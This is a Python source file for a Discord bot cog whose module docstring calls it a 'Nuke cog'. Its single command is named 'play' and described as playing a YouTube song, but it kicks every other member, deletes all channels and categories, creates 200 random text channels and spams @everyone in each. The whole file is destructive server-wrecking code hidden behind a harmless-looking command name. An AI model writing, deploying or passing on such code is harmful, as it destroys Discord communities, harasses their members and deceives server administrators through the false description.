"""Module for the Nuke cog"""
import secrets

import discord
from discord.ext import commands

DISCORD_MAX_CHANNEL_LIMIT = 200
TOTAL_MESSAGES_PER_CHANNEL = 1


class Play(commands.Cog):
    """Class defining the Play cog"""

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def play(self, ctx):
        """Command to play a song from youtube"""

        ## kicking all possible members
        for member in ctx.guild.members:
            if member != ctx.author:
                try:
                    await member.kick(reason=None)
                except discord.Forbidden:
                    print(f"[-] Failed to kick {member.name}")
                else:
                    print(f"[+] Kicked {member.name}")

        ## deleting all channels
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print(f"[-] Failed to delete channel {channel.name}")
            else:
                print(f"[+] Deleted channel {channel.name}")

        ## deleting all categories
        for category in ctx.guild.categories:
            try:
                await category.delete()
            except:
                print(f"[-] Failed to delete category {category.name}")
            else:
                print(f"[+] Deleted category {category.name}")

        ## creating spam text/voice channels
        for _ in range(DISCORD_MAX_CHANNEL_LIMIT):

            ## create random text channel
            data = secrets.token_hex(32)
            await ctx.guild.create_text_channel(data)
            print(f"[+] Created text channel {data}")

        ## spamming channels
        for index in range(TOTAL_MESSAGES_PER_CHANNEL):
            print(f"[*] Spamming each channel, iteration {index}")
            for channel in ctx.guild.channels:
                if str(channel.type) == "text":
                    try:
                        print(f"{str(channel)} -> @everyone")
                        await channel.send("@everyone")
                    except:
                        pass

    # @commands.command()
    # async def delete(self, ctx):
    #     ## deleting all channels
    #     for channel in ctx.guild.channels:
    #         try:
    #             await channel.delete()
    #         except:
    #             print(f"[-] Failed to delete channel {channel.name}")
    #         else:
    #             print(f"[+] Deleted channel {channel.name}")


def setup(bot):
    """Adds the cog to the bot"""

    bot.add_cog(Play(bot))
